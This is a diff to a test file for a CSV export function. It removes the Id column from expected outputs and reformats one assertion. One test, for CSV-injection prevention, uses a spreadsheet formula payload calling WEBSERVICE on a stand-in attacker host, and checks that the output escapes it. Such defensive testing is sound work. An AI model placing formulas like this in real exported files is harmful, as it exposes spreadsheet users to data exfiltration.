@@ -62,9 +62,10 @@ describe('generateCsv', () => {
       },
     ];
     const csv = generateCsv({ columns, rows });
-    expect(csv)
-      .toEqual(`Id,Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation
-1,some field,,https://www.test.com,"[{""label"":""secondary link 1"",""url"":""https://www.test.com""},{""label"":""secondary link 2"",""url"":""https://www.test.com""}]",a relation`);
+    expect(csv).toEqual(
+      `Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation
+some field,,https://www.test.com,"[{""label"":""secondary link 1"",""url"":""https://www.test.com""},{""label"":""secondary link 2"",""url"":""https://www.test.com""}]",a relation`,
+    );
   });
 
   it('generates csv with multi-select and array fields as JSON arrays', () => {
@@ -119,9 +120,9 @@ describe('generateCsv', () => {
       '{"0":"JavaScript","1":"TypeScript","2":"React"}',
     );
 
-    expect(csv).toContain('Id,Name,Tags,Skills');
-    expect(csv).toContain('1,John Doe');
-    expect(csv).toContain('2,Jane Smith');
+    expect(csv).toContain('Name,Tags,Skills');
+    expect(csv).toContain('John Doe');
+    expect(csv).toContain('Jane Smith');
   });
 
   it('generates csv with empty multi-select and array fields as empty JSON arrays', () => {
@@ -162,8 +163,8 @@ describe('generateCsv', () => {
 
     expect(csv).toContain('[]');
 
-    expect(csv).toContain('Id,Name,Tags,Skills');
-    expect(csv).toContain('1,John Doe,[],[]');
+    expect(csv).toContain('Name,Tags,Skills');
+    expect(csv).toContain('John Doe,[],[]');
   });
 
   describe('CSV Injection Prevention with ZWJ', () => {
@@ -203,7 +204,7 @@ describe('generateCsv', () => {
         '1,Test User,=WEBSERVICE("http://attacker.com")',
       );
       expect(csv).toContain(
-        `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
+        `Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
       );
     });
 
